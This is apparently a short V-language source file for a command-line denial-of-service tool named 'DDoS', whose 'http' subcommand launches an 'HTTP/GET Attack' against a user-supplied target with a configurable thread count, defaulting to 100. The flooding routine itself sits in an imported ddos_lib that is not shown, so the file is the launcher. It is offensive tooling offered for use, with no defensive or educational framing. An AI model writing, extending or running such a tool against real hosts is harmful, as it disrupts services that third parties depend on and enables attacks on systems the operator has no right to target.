import ddos_lib
import os
import cli { Command, Flag }

fn http_ddos(cmd Command) ! {
	threads := cmd.flags.get_int('threads') or {
		panic('Failed to get `threads`: ${err}')
	}

	ddos_lib.ddos(threads, cmd.args[0])
}

fn main() {
	mut cmd := Command{
		name: 'DDoS'
		description: 'DDoS cli tool'
		version: '1.0.0'
	}
	
	mut ddos_cmd := Command{
		name: 'http'
		description: 'HTTP/GET Attack'
		usage: '<target>'
		required_args: 1
		execute: http_ddos
	}

	ddos_cmd.add_flag(Flag{
		flag: .int,
		name: 'threads',
		default_value: ['100']
	})

	cmd.add_command(ddos_cmd)
	cmd.setup()
	cmd.parse(os.args)
}

